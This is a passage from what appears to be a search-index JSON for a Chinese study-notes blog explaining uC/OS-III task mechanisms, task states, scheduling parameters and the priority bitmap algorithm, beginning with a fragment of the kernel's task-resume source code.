/*\u4efb\u52a1\u5904\u4e8e\u6302\u8d77\u548c\u7b49\u5f85\u4e24\u79cd\u72b6\u6001\uff0c\u4ecd\u7136\u662f\u5148\u5c06\u5d4c\u5957\u5c42\u6570\u51cf1\uff0c\u7136\u540e\u68c0\u67e5 \u6302\u8d77\u5d4c\u5957\u7684\u5c42\u6570\u662f\u5426\u4e3a0\uff0c\u4e3a0\u5c31\u53ea\u5269\u4e0b\u7b49\u5f85\u72b6\u6001\u4e86*/ case OS_TASK_STATE_PEND_SUSPENDED: p_tcb->SuspendCtr--; if (p_tcb->SuspendCtr == (OS_NESTING_CTR)0) { p_tcb->TaskState = OS_TASK_STATE_PEND; } CPU_CRITICAL_EXIT(); break; /*\u4efb\u52a1\u5904\u4e8e\u6302\u8d77\u548c\u8d85\u65f6\u7b49\u5f85\u4e24\u79cd\u72b6\u6001\uff0c\u4ecd\u7136\u662f\u5148\u5c06\u5d4c\u5957\u5c42\u6570\u51cf1\uff0c\u7136\u540e\u68c0\u67e5 \u6302\u8d77\u5d4c\u5957\u7684\u5c42\u6570\u662f\u5426\u4e3a0\uff0c\u4e3a0\u5c31\u53ea\u5269\u4e0b\u8d85\u65f6\u7b49\u5f85\u72b6\u6001\u4e86*/ case OS_TASK_STATE_PEND_TIMEOUT_SUSPENDED: p_tcb->SuspendCtr--; if (p_tcb->SuspendCtr == (OS_NESTING_CTR)0) { p_tcb->TaskState = OS_TASK_STATE_PEND_TIMEOUT; } CPU_CRITICAL_EXIT(); break; default: CPU_CRITICAL_EXIT(); *p_err = O 11. \u53c2\u8003\u6587\u732e # [1] \u674e\u60a6\u57ce. \u03bcC/OS-III \u6e90\u7801\u5206\u6790\u7b14\u8bb0. \u673a\u68b0\u5de5\u4e1a\u51fa\u7248\u793e, 2016. \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"5.uCos\u4e2d\u7684\u4efb\u52a1\u673a\u5236\u548c\u4f18\u5148\u7ea7\u4f4d\u56fe\u7b97\u6cd5"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/5.uCos%E4%B8%AD%E7%9A%84%E4%BB%BB%E5%8A%A1%E6%9C%BA%E5%88%B6%E5%92%8C%E4%BC%98%E5%85%88%E7%BA%A7%E4%BD%8D%E5%9B%BE%E7%AE%97%E6%B3%95/#ucos","text":"","title":"uCos\u4e2d\u7684\u4efb\u52a1\u673a\u5236\u548c\u4f18\u5148\u7ea7\u4f4d\u56fe\u7b97\u6cd5"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/5.uCos%E4%B8%AD%E7%9A%84%E4%BB%BB%E5%8A%A1%E6%9C%BA%E5%88%B6%E5%92%8C%E4%BC%98%E5%85%88%E7%BA%A7%E4%BD%8D%E5%9B%BE%E7%AE%97%E6%B3%95/#_1","text":"uCos\u4e2d\u7684\u4efb\u52a1\u673a\u5236\u548c\u4f18\u5148\u7ea7\u4f4d\u56fe\u7b97\u6cd5 \u76ee\u5f55 1. \u80cc\u666f 2. \u4efb\u52a1\u6982\u8ff0 2.1. \u8fdb\u7a0b\u4e0e\u7ebf\u7a0b 2.1.1. \u4ece\u8fdb\u7a0b\u5230\u7ebf\u7a0b 2.1.2. \u8fdb\u7a0b/\u7ebf\u7a0b\u6a21\u578b 3. \u4efb\u52a1\u6982\u8ff0 3.1. \u4efb\u52a1\u5b9a\u4e49 3.2. \u4efb\u52a1\u7684\u4f18\u52bf 3.3. \u4efb\u52a1\u7684\u5206\u7c7b 4. \u4efb\u52a1\u53c2\u6570 5. \u4efb\u52a1\u7684\u72b6\u6001\u4e0e\u53d8\u8fc1 6. \u4efb\u52a1\u63a7\u5236\u5757 7. \u5c31\u7eea\u7b97\u6cd5 7.1. \u5c31\u7eea\u8868 7.2. \u4f18\u5148\u7ea7\u4f4d\u56fe\u7b97\u6cd5 7.2.1. \u4f18\u5148\u7ea7\u4f4d\u56fe 7.2.2. \u4efb\u52a1\u8fdb\u5165\u5c31\u7eea\u6001 7.2.3. \u4efb\u52a1\u9000\u51fa\u5c31\u7eea\u6001 7.2.4. \u4f18\u5148\u7ea7\u5224\u5b9a\u8868 7.2.5. \u83b7\u53d6\u8fdb\u5165\u5c31\u7eea\u6001\u7684\u6700\u9ad8\u4f18\u5148\u7ea7 8. \u4efb\u52a1\u8c03\u5ea6 8.1. \u6982\u8ff0 8.2. \u4efb\u52a1\u5207\u6362 8.3. \u4efb\u52a1\u5207\u6362\u7684\u57fa\u672c\u6b65\u9aa4 8.4. \u4efb\u52a1\u5207\u6362\u7684\u65f6\u673a 9. \u4efb\u52a1\u7ba1\u7406\u673a\u5236 9.1. \u4e3b\u8981\u4efb\u52a1\u7ba1\u7406\u529f\u80fd 9.2. \u521b\u5efa\u4efb\u52a1 9.3. \u5806\u6808\u7a7a\u95f4 9.4. \u5220\u9664\u4efb\u52a1 9.5. \u6302\u8d77\u4efb\u52a1 9.6. \u89e3\u6302\u4efb\u52a1 9.7. \u4e00\u4e9b\u7279\u6b8a\u7684\u7cfb\u7edf\u4efb\u52a1 10. \u6e90\u7801\u5206\u6790 10.1. \u4efb\u52a1\u8c03\u5ea6\u51fd\u6570 10.2. \u4efb\u52a1\u521d\u59cb\u5316\u51fd\u6570 10.3. \u4efb\u52a1\u6302\u8d77\u51fd\u6570 10.4. \u6062\u590d\u4efb\u52a1\u6302\u8d77\u51fd\u6570 11. \u53c2\u8003\u6587\u732e","title":"\u76ee\u5f55"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/5.uCos%E4%B8%AD%E7%9A%84%E4%BB%BB%E5%8A%A1%E6%9C%BA%E5%88%B6%E5%92%8C%E4%BC%98%E5%85%88%E7%BA%A7%E4%BD%8D%E5%9B%BE%E7%AE%97%E6%B3%95/#1","text":"\u4eca\u5929\u8001\u5e08\u4e0a\u8bfe\u8bb2\u5230\u4e86uC/OS\u4e2d\u7684\u4efb\u52a1\u673a\u5236\uff0c\u6240\u4ee5\u6211\u60f3\u8981\u7ed3\u5408 \u300a\u03bcC/OS-III\u6e90\u7801\u5206\u6790\u7b14\u8bb0\u300b \u548c\u4e2d\u56fd\u5927\u5b66MOOC-\u7535\u5b50\u79d1\u6280\u5927\u5b66 \u300a\u5d4c\u5165\u5f0f\u7cfb\u7edf\u53ca\u5e94\u7528\u300b PPT\u5199\u4e00\u7bc7\u7b14\u8bb0\u5bf9\u8fd9\u90e8\u5206\u7684\u5185\u5bb9\u8fdb\u884c\u603b\u7ed3\u3002","title":"1. \u80cc\u666f"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/5.uCos%E4%B8%AD%E7%9A%84%E4%BB%BB%E5%8A%A1%E6%9C%BA%E5%88%B6%E5%92%8C%E4%BC%98%E5%85%88%E7%BA%A7%E4%BD%8D%E5%9B%BE%E7%AE%97%E6%B3%95/#2","text":"","title":"2. \u4efb\u52a1\u6982\u8ff0"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/5.uCos%E4%B8%AD%E7%9A%84%E4%BB%BB%E5%8A%A1%E6%9C%BA%E5%88%B6%E5%92%8C%E4%BC%98%E5%85%88%E7%BA%A7%E4%BD%8D%E5%9B%BE%E7%AE%97%E6%B3%95/#21","text":"","title":"2.1. \u8fdb\u7a0b\u4e0e\u7ebf\u7a0b"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/5.uCos%E4%B8%AD%E7%9A%84%E4%BB%BB%E5%8A%A1%E6%9C%BA%E5%88%B6%E5%92%8C%E4%BC%98%E5%85%88%E7%BA%A7%E4%BD%8D%E5%9B%BE%E7%AE%97%E6%B3%95/#211","text":"\u5b9a\u4e49 \uff1a\u8fdb\u7a0b\u6700\u521d\u7531Multics\u7684\u8bbe\u8ba1\u8005\u572820\u4e16\u7eaa60\u5e74\u4ee3\u63d0\u51fa\u6765\u7684\uff0c\u4e3b\u8981\u5305\u62ec\u4ee5\u4e0b\u5185\u5bb9\uff1a \u4e00\u4e2a\u6b63\u5728\u6267\u884c\u7684\u7a0b\u5e8f \u8ba1\u7b97\u673a\u4e2d\u6b63\u5728\u8fd0\u884c\u7684\u7a0b\u5e8f\u7684\u4e00\u4e2a\u5b9e\u4f8b \u53ef\u4ee5\u5206\u914d\u7ed9\u5904\u7406\u5668\uff0c\u5e76\u7531\u5904\u7406\u5668\u6267\u884c\u7684\u4e00\u4e2a\u5b9e\u4f53 \u7531\u4e00\u4e2a\u987a\u5e8f\u7684\u6267\u884c\u7ebf\u7a0b\u3001\u4e00\u4e2a\u5f53\u524d\u72b6\u6001\u548c\u4e00\u7ec4\u76f8\u5173\u7684\u7cfb\u7edf\u8d44\u6e90\u6240\u523b\u753b\u7684\u6d3b\u52a8\u5355\u5143 \u7ec4\u6210 \uff1a\u8fdb\u7a0b\u7531\u4ee3\u7801\u3001\u6570\u636e\u3001\u5806\u6808\u548c\u8fdb\u7a0b\u63a7\u5236\u5757\u6784\u6210 \u8fdb\u7a0b\u63a7\u5236\u5757\u5305\u542b\u4e86\u64cd\u4f5c\u7cfb\u7edf\u7528\u6765\u63a7\u5236\u8fdb\u7a0b\u6240\u9700\u8981\u7684\u4fe1\u606f \u5305\u62ec\u8fdb\u7a0b\u72b6\u6001\u548c\u8c03\u5ea6\u4fe1\u606f\u3001CPU\u5bc4\u5b58\u5668\u4fe1\u606f\u3001\u5185\u5b58\u7ba1\u7406\u4fe1\u606f\u548cI/O\u72b6\u6001\u4fe1\u606f\u3002 \u4f5c\u7528 \uff1a\u65e9\u671f\u7684\u8fdb\u7a0b\uff0c\u5305\u542b\u4e86\u4ee5\u4e0b\u4e24\u4e2a\u65b9\u9762\u7684\u5185\u5bb9 \u8d44\u6e90\u3002\u8fdb\u7a0b\u662f\u8d44\u6e90\u5206\u914d\u7684\u57fa\u672c\u5355\u4f4d\uff0c\u4e00\u4e2a\u8fdb\u7a0b\u5305\u62ec\u4e00\u4e2a\u4fdd\u5b58\u8fdb\u7a0b\u6620\u50cf\u7684\u865a\u62df\u5730\u5740\u7a7a\u95f4\u3001\u4e3b\u5b58\u3001I/O\u8bbe\u5907\u548c\u6587\u4ef6\u7b49\u8d44\u6e90\u3002 \u8c03\u5ea6\u6267\u884c\u3002\u8fdb\u7a0b\u4f5c\u4e3a\u64cd\u4f5c\u7cfb\u7edf\u7684\u8c03\u5ea6\u5b9e\u4f53\uff0c\u662f\u8c03\u5ea6\u7684\u57fa\u672c\u5355\u4f4d\u3002 \u6f14\u53d8 \uff1a\u968f\u7740\u64cd\u4f5c\u7cfb\u7edf\u7684\u53d1\u5c55\uff0c\u8fdb\u7a0b\u6240\u5305\u542b\u7684\u4e24\u4e2a\u65b9\u9762\u7684\u5185\u5bb9\u9010\u6e10\u88ab\u5206\u5f00\uff1a \u8f7b\u91cf\u7ea7\u8fdb\u7a0b\u6216\u7ebf\u7a0b\uff1a\u8c03\u5ea6\u6267\u884c\u7684\u5355\u4f4d \u8fdb\u7a0b\uff1a\u8d44\u6e90\u5206\u914d\u7684\u5355\u4f4d \u7ebf\u7a0b\u662f\u8fdb\u7a0b\u5185\u90e8\u4e00\u4e2a\u76f8\u5bf9\u72ec\u7acb\u7684\u63a7\u5236\u6d41\uff0c\u7531\u7ebf\u7a0b\u4e0a\u4e0b\u6587\u548c\u9700\u8981\u6267\u884c\u7684\u4e00\u6bb5\u7a0b\u5e8f\u6307\u4ee4\u6784\u6210 \u5728\u8fdb\u7a0b\u4e2d\uff0c\u6240\u6709\u7ebf\u7a0b\u5171\u4eab\u8be5\u8fdb\u7a0b\u7684\u72b6\u6001\u548c\u8d44\u6e90\uff0c\u53ef\u4ee5\u8bbf\u95ee\u76f8\u540c\u7684\u6570\u636e \u7ebf\u7a0b\u7684\u4f18\u52bf \uff1a \u521b\u5efa \uff1a\u5728\u4e00\u4e2a\u5df2\u6709\u8fdb\u7a0b\u4e2d\u521b\u5efa\u4e00\u4e2a\u65b0\u7ebf\u7a0b\u6bd4\u521b\u5efa\u4e00\u4e2a\u5168\u65b0\u7684\u8fdb\u7a0b\u6240\u9700\u7684\u65f6\u95f4\u5f00\u9500\u5c11 \u7ec8\u6b62 \uff1a\u7ec8\u6b62\u4e00\u4e2a\u7ebf\u7a0b\u6bd4\u7ec8\u6b62\u4e00\u4e2a\u8fdb\u7a0b\u6240\u82b1\u8d39\u7684\u65f6\u95f4\u5c11 \u5207\u6362 \uff1a\u7ebf\u7a0b\u5207\u6362\u6bd4\u8fdb\u7a0b\u5207\u6362\u6240\u82b1\u8d39\u7684\u65f6\u95f4\u5c11 \u901a\u4fe1 \uff1a\u4f7f\u540c\u4e00\u8fdb\u7a0b\u5185\u90e8\u4e0d\u540c\u7ebf\u7a0b\u4e4b\u95f4\u7684\u901a\u4fe1\u6548\u7387\u5f97\u5230\u663e\u8457\u63d0\u9ad8\u3002 \u5728\u5927\u591a\u6570\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u4e0d\u540c\u8fdb\u7a0b\u4e4b\u95f4\u7684\u901a\u4fe1\u9700\u8981\u5185\u6838\u7684\u5e72\u9884\uff0c\u800c\u540c\u4e00\u8fdb\u7a0b\u5185\u90e8\u4e0d\u540c\u7ebf\u7a0b\u4e4b\u95f4\u5219\u53ef\u76f4\u63a5\u901a\u4fe1","title":"2.1.1. \u4ece\u8fdb\u7a0b\u5230\u7ebf\u7a0b"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/5.uCos%E4%B8%AD%E7%9A%84%E4%BB%BB%E5%8A%A1%E6%9C%BA%E5%88%B6%E5%92%8C%E4%BC%98%E5%85%88%E7%BA%A7%E4%BD%8D%E5%9B%BE%E7%AE%97%E6%B3%95/#212","text":"\u6a21\u578b \uff1a\u5f15\u5165\u7ebf\u7a0b\u7684\u6982\u5ff5\u540e\uff0c\u53ef\u628a\u8fdb\u7a0b\u548c\u7ebf\u7a0b\u7684\u4f7f\u7528\u5206\u4e3a\u4ee5\u4e0b\u51e0\u79cd\u6a21\u578b: \\text{Figure 1. \u6a21\u578b} \u5355\u8fdb\u7a0b/\u591a\u7ebf\u7a0b\u6a21\u578b \uff1a\u5927\u591a\u6570\u5d4c\u5165\u5f0f\u5b9e\u65f6\u5185\u6838\u4f7f\u7528\u4e86\u5355\u8fdb\u7a0b/\u591a\u7ebf\u7a0b\u6a21\u578b\uff0c\u6216\u7b80\u5355\u5730\u79f0\u4e3a \u4efb\u52a1\u6a21\u578b \u628a\u6574\u4e2a\u5e94\u7528\u5f53\u4f5c\u4e00\u4e2a\u6ca1\u6709\u5b9a\u4e49\u7684\u8fdb\u7a0b\u6765\u5bf9\u5f85 \u5e94\u7528\u5219\u88ab\u5212\u5206\u4e3a\u591a\u4e2a\u4efb\u52a1\u7684\u5f62\u5f0f\u6765\u8fdb\u884c\u5904\u7406 \u9002\u7528\u4e8e\u5b9e\u65f6\u6027\u8981\u6c42\u8f83\u9ad8\u7684\u3001\u76f8\u5bf9\u7b80\u5355\u7684\u5e94\u7528 \u591a\u8fdb\u7a0b/\u591a\u7ebf\u7a0b\u6a21\u578b \uff1a\u4e5f\u6709\u4e00\u4e9b\u5d4c\u5165\u5f0f\u5b9e\u65f6\u64cd\u4f5c\u7cfb\u7edf\u91c7\u7528\u4e86\u591a\u8fdb\u7a0b/\u591a\u7ebf\u7a0b\u6a21\u578b \u7cfb\u7edf\u4e2d\u5305\u542b\u591a\u4e2a\u8fdb\u7a0b\uff0c\u6bcf\u4e2a\u8fdb\u7a0b\u5bf9\u5e94\u53c8\u5305\u542b\u591a\u4e2a\u7ebf\u7a0b \u9002\u5408\u4e8e\u5904\u7406\u590d\u6742\u7684\u5e94\u7528","title":"2.1.2. \u8fdb\u7a0b/\u7ebf\u7a0b\u6a21\u578b"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/5.uCos%E4%B8%AD%E7%9A%84%E4%BB%BB%E5%8A%A1%E6%9C%BA%E5%88%B6%E5%92%8C%E4%BC%98%E5%85%88%E7%BA%A7%E4%BD%8D%E5%9B%BE%E7%AE%97%E6%B3%95/#3","text":"","title":"3. \u4efb\u52a1\u6982\u8ff0"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/5.uCos%E4%B8%AD%E7%9A%84%E4%BB%BB%E5%8A%A1%E6%9C%BA%E5%88%B6%E5%92%8C%E4%BC%98%E5%85%88%E7%BA%A7%E4%BD%8D%E5%9B%BE%E7%AE%97%E6%B3%95/#31","text":"\u5b9a\u4e49 \uff1a\u4efb\u52a1\u662f\u5d4c\u5165\u5f0f\u5b9e\u65f6\u64cd\u4f5c\u7cfb\u7edf\u5185\u6838\u7684\u57fa\u672c\u8c03\u5ea6\u5355\u4f4d\u3002 \u5185\u5bb9 \uff1a\u4efb\u52a1\u4e3b\u8981\u5305\u542b\u4ee5\u4e0b\u5185\u5bb9 \u4ee3\u7801 \uff1a\u4e00\u6bb5\u53ef\u6267\u884c\u7684\u7a0b\u5e8f \u6570\u636e \uff1a\u7a0b\u5e8f\u6240\u9700\u8981\u7684\u76f8\u5173\u6570\u636e\uff08\u53d8\u91cf\u3001\u5de5\u4f5c\u7a7a\u95f4\u3001\u7f13\u51b2\u533a\u7b49\uff09 \u5806\u6808 \uff1a\u5c40\u90e8\u53d8\u91cf\uff0c\u5b50\u7a0b\u5e8f\u8c03\u7528\uff0c\u4efb\u52a1\u4e0a\u4e0b\u6587\u7b49 \u4e0a\u4e0b\u6587 \uff1a\u7a0b\u5e8f\u6267\u884c\u7684\u4e0a\u4e0b\u6587\u73af\u5883 \u6ce8\uff1a\u4efb\u52a1\u901a\u5e38\u5305\u542b\u4e00\u4e2a\u5177\u6709\u65e0\u9650\u5faa\u73af\u7684\u7a0b\u5e8f","title":"3.1. \u4efb\u52a1\u5b9a\u4e49"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/5.uCos%E4%B8%AD%E7%9A%84%E4%BB%BB%E5%8A%A1%E6%9C%BA%E5%88%B6%E5%92%8C%E4%BC%98%E5%85%88%E7%BA%A7%E4%BD%8D%E5%9B%BE%E7%AE%97%E6%B3%95/#32","text":"\\text{Figure 2. \u4efb\u52a1\u7684\u4f18\u52bf}","title":"3.2. \u4efb\u52a1\u7684\u4f18\u52bf"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/5.uCos%E4%B8%AD%E7%9A%84%E4%BB%BB%E5%8A%A1%E6%9C%BA%E5%88%B6%E5%92%8C%E4%BC%98%E5%85%88%E7%BA%A7%E4%BD%8D%E5%9B%BE%E7%AE%97%E6%B3%95/#33","text":"\\text{Figure 3. \u4efb\u52a1\u7684\u5206\u7c7b-\u6309\u5230\u8fbe\u60c5\u51b5\u7684\u53ef\u9884\u6d4b\u6027} \\text{Figure 4. \u4efb\u52a1\u7684\u5206\u7c7b-\u6309\u91cd\u8981\u7a0b\u5ea6\u5212\u5206}","title":"3.3. \u4efb\u52a1\u7684\u5206\u7c7b"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/5.uCos%E4%B8%AD%E7%9A%84%E4%BB%BB%E5%8A%A1%E6%9C%BA%E5%88%B6%E5%92%8C%E4%BC%98%E5%85%88%E7%BA%A7%E4%BD%8D%E5%9B%BE%E7%AE%97%E6%B3%95/#4","text":"\u4f18\u5148\u7ea7 \u5b9a\u4e49 \uff1a\u8868\u793a\u4efb\u52a1\u5bf9\u5e94\u5de5\u4f5c\u5185\u5bb9\u5728\u5904\u7406\u4e0a\u7684\u4f18\u5148\u7a0b\u5ea6 \u4f5c\u7528 \uff1a\u4f18\u5148\u7ea7\u8d8a\u9ad8\uff0c\u8868\u660e\u4efb\u52a1\u8d8a\u9700\u8981\u5f97\u5230\u4f18\u5148\u5904\u7406 \u98de\u884c\u5668\u4e2d\u5904\u7406\u7a33\u5b9a\u6027\u63a7\u5236\u7684\u4efb\u52a1\uff0c\u5c31\u9700\u8981\u5177\u6709\u8f83\u9ad8\u7684\u4f18\u5148\u7ea7\uff0c\u4e00\u65e6\u6267\u884c\u6761\u4ef6\u5f97\u5230\u6ee1\u8db3\uff0c\u5e94\u53ca\u65f6\u5f97\u5230\u6267\u884c \u5206\u7c7b \uff1a\u4efb\u52a1\u7684\u4f18\u5148\u7ea7\u5206\u4e3a\u9759\u6001\u4f18\u5148\u7ea7\u548c\u52a8\u6001\u4f18\u5148\u7ea7\u3002 \u9759\u6001\u4f18\u5148\u7ea7 \uff1a\u4efb\u52a1\u7684\u4f18\u5148\u7ea7\u88ab\u786e\u5b9a\u540e\uff0c\u5728\u7cfb\u7edf\u8fd0\u884c\u8fc7\u7a0b\u4e2d\u5c06\u4e0d\u518d\u53d1\u751f\u53d8\u5316 \u52a8\u6001\u4f18\u5148\u7ea7 \uff1a\u7cfb\u7edf\u8fd0\u884c\u8fc7\u7a0b\u4e2d\uff0c\u4efb\u52a1\u7684\u4f18\u5148\u7ea7\u662f\u53ef\u4ee5\u52a8\u6001\u53d8\u5316\u7684 \u6570\u91cf \uff1auCOS-II\u4e2d\u5171\u53ef\u7ba1\u740664\u4e2a\u4efb\u52a1\uff0c\u6bcf\u4e2a\u4efb\u52a1\u5fc5\u987b\u6709\u4e0d\u540c\u7684\u4f18\u5148\u7ea7\u3002uCOS-III\u4e2d\u5df2\u7ecf\u53ef\u4ee5\u652f\u6301\u540c\u4e00\u4f18\u5148\u7ea7\u6709\u591a\u4e2a\u4efb\u52a1\uff0c\u4e14\u53ef\u4ee5\u81ea\u884c\u8bbe\u7f6e\u4f18\u5148\u7ea7\u7684\u4e2a\u6570 \u5468\u671f \u5468\u671f \uff1a\u5468\u671f\u4efb\u52a1\u6240\u5177\u6709\u7684\u53c2\u6570\uff0c\u8868\u793a\u4efb\u52a1\u5468\u671f\u6027\u6267\u884c\u7684\u95f4\u9694\u65f6\u95f4 \u4efb\u52a1\u7684\u8ba1\u7b97\u65f6\u95f4 \u4efb\u52a1\u5728 \u7279\u5b9a\u786c\u4ef6\u73af\u5883 \u4e0b\u88ab\u5b8c\u6574\u6267\u884c\u6240\u9700\u8981\u7684\u65f6\u95f4\uff0c\u4e5f\u88ab\u79f0\u4e3a\u662f\u4efb\u52a1\u7684\u6267\u884c\u65f6\u95f4\uff08execution time\uff09 \u7531\u4e8e\u4efb\u52a1\u6bcf\u6b21\u6267\u884c\u7684\u8f6f\u4ef6\u73af\u5883\u7684 \u5dee\u5f02\u6027 \uff0c\u5bfc\u81f4\u4efb\u52a1\u5728\u5404\u6b21\u5177\u4f53\u6267\u884c\u8fc7\u7a0b\u4e2d\u7684\u8ba1\u7b97\u65f6\u95f4\u5404\u6709\u4e0d\u540c\u3002 \u901a\u5e38\u7528 \u6700\u574f\u60c5\u51b5\u4e0b \u7684\u6267\u884c\u65f6\u95f4\uff08worst case time\uff09\u6216\u662f\u9700\u8981\u7684 \u6700\u957f\u6267\u884c\u65f6\u95f4 \u6765\u8868\u793a\uff0c\u4e5f\u53ef\u7528 \u7edf\u8ba1\u65f6\u95f4 \uff08statistical time\uff09\u6765\u8868\u793a\u3002 \u4efb\u52a1\u7684\u5c31\u7eea\u65f6\u95f4 \u4efb\u52a1\u5177\u5907\u4e86\u5728\u5904\u7406\u5668\u4e0a\u88ab\u6267\u884c\u6240\u9700\u8981\u6761\u4ef6\u65f6\u7684\u65f6\u95f4 \u622a\u6b62\u65f6\u95f4 \u5b9a\u4e49\uff1a\u610f\u5473\u7740\u4efb\u52a1\u9700\u8981\u5728\u8be5\u65f6\u95f4\u5230\u6765\u4e4b\u524d\u88ab\u6267\u884c\u5b8c\u6210\u3002 \u5206\u7c7b\uff1a \u622a\u6b62\u65f6\u95f4\u53ef\u4ee5\u901a\u8fc7\u7edd\u5bf9\u622a\u6b62\u65f6\u95f4\uff08absolute deadline\uff09\u548c\u76f8\u5bf9\u622a\u6b62\u65f6\u95f4\uff08relative time\uff09\u4e24\u79cd\u65b9\u5f0f\u6765\u8868\u793a\u3002\u76f8\u5bf9\u622a\u6b62\u65f6\u95f4\u4e3a\u4efb\u52a1\u7684\u7edd\u5bf9\u622a\u6b62\u65f6\u95f4\u51cf\u53bb\u4efb\u52a1\u7684\u5c31\u7eea\u65f6\u95f4\u3002 \u622a\u6b62\u65f6\u95f4\u53ef\u4ee5\u5206\u4e3a\u5f3a\u622a\u6b62\u65f6\u95f4\uff08hard deadline\uff09\u548c\u5f31\u622a\u6b62\u65f6\u95f4\uff08soft deadline\uff09\u4e24\u79cd\u60c5\u51b5\uff1a \u5177\u6709\u5f3a\u622a\u6b62\u65f6\u95f4\u7684\u4efb\u52a1\u5373\u4e3a\u5173\u952e\u4efb\u52a1\uff0c\u5982\u679c\u622a\u6b62\u65f6\u95f4\u4e0d\u80fd\u5f97\u5230\u6ee1\u8db3\uff0c\u5c31\u4f1a\u51fa\u73b0\u4e25\u91cd\u7684\u540e\u679c\u3002 \u62e5\u6709\u5173\u952e\u4efb\u52a1\u7684\u5b9e\u65f6\u7cfb\u7edf\u53c8\u88ab\u79f0\u4e3a\u5f3a\u5b9e\u65f6\uff08hard real-time\uff09 \u7cfb\u7edf\uff0c\u5426\u5219\u79f0\u4e3a\u5f31\u5b9e\u65f6\uff08soft real-time\uff09\u7cfb\u7edf\u3002","title":"4. \u4efb\u52a1\u53c2\u6570"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/5.uCos%E4%B8%AD%E7%9A%84%E4%BB%BB%E5%8A%A1%E6%9C%BA%E5%88%B6%E5%92%8C%E4%BC%98%E5%85%88%E7%BA%A7%E4%BD%8D%E5%9B%BE%E7%AE%97%E6%B3%95/#5","text":"\u4efb\u52a1\u62e5\u6709\u7684\u8d44\u6e90\u60c5\u51b5\u662f\u4e0d\u65ad\u53d8\u5316\u7684\uff0c\u5bfc\u81f4\u4efb\u52a1\u72b6\u6001\u4e5f\u8868\u73b0\u51fa\u4e0d\u65ad\u53d8\u5316\u7684\u7279\u6027\u3002 \u4e0d\u540c\u7684\u5b9e\u65f6\u5185\u6838\u5b9e\u73b0\u65b9\u5f0f\u5bf9\u4efb\u52a1\u72b6\u6001\u7684\u5b9a\u4e49\u4e0d\u5c3d\u76f8\u540c\uff0c\u4f46\u662f\u90fd\u53ef\u4ee5\u6982\u62ec\u4e3a\u4e09\u79cd\u57fa\u672c \u7684\u72b6\u6001 \u7b49\u5f85 \uff08waiting\uff09\uff1a\u4efb\u52a1\u5728\u7b49\u5f85\u67d0\u4e2a\u4e8b\u4ef6\u7684\u53d1\u751f\uff1b \u5c31\u7eea \uff08ready\uff09\uff1a \u4efb\u52a1\u7b49\u5f85\u83b7\u5f97\u5904\u7406\u5668\u8d44\u6e90\uff1b \u6267\u884c \uff08running\uff09\uff1a\u4efb\u52a1\u83b7\u5f97\u5904\u7406\u5668\u8d44\u6e90\uff0c\u6240\u5305\u542b\u7684\u4ee3\u7801\u5185\u5bb9\u6b63\u5728\u88ab\u6267\u884c\u3002 \u5355\u5904\u7406\u5668\u7cfb\u7edf\u4e2d\u4efb\u52a1\u7684\u7279\u70b9\uff1a \u4efb\u4f55\u65f6\u5019\u90fd\u53ea\u6709\u4e00\u4e2a\u4efb\u52a1\u5728CPU\u4e2d\u6267\u884c\u3002\u65e0\u4e8b\u65f6\u5c31\u8fd0\u884c\u7a7a\u95f2\u4efb\u52a1\u6267\u884c\u7a7a\u64cd\u4f5c\u3002 \u4efb\u4f55\u4e00\u4e2a\u53ef\u4ee5\u6267\u884c\u7684\u4efb\u52a1\u90fd\u5fc5\u987b\u5904\u4e8e\u5c31\u7eea\u72b6\u6001\u3002 \u8c03\u5ea6\u7a0b\u5e8f\u4ece\u4efb\u52a1\u7684\u5c31\u7eea\u961f\u5217\u4e2d\u9009\u62e9\u4e0b\u4e00\u4e2a\u9700\u8981\u6267\u884c\u7684\u4efb\u52a1\u3002 \u5904\u4e8e\u5c31\u7eea\u72b6\u6001\u7684\u4efb\u52a1\u62e5\u6709\u9664CPU\u4ee5\u5916\u7684\u5176\u4ed6\u6240\u6709\u9700\u8981\u7684\u8d44\u6e90\u3002 